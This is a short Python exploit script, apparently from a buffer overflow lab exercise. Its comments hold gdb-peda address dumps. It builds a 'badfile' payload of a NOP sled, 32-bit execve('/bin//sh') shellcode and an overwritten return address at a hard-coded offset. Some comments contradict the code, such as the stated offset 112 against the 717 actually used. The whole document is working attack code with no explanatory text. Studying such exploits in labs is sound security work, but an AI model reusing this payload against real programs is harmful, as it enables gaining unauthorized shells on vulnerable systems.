# gdb-peda$ p $ebp
# $2 = (void *) 0xffffd1c8
# gdb-peda$ p &arr
# $3 = (int (*)[10]) 0xffffd198
# gdb-peda$ p &buffer 
# $4 = (char (*)[665]) 0xffffceff
import sys 
# 0x565562ad
shellcode= ( 
"\xbb\xad\x62\x55\x56" 
"\xff\xd3"
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1064)) 
# Put the shellcode at the end 
start = 1064 - len(shellcode) 
content[start:] = shellcode 
# content[401:401+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffb708 + 150

# for i in range(815-4*10,830, 4):
content[717:721] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

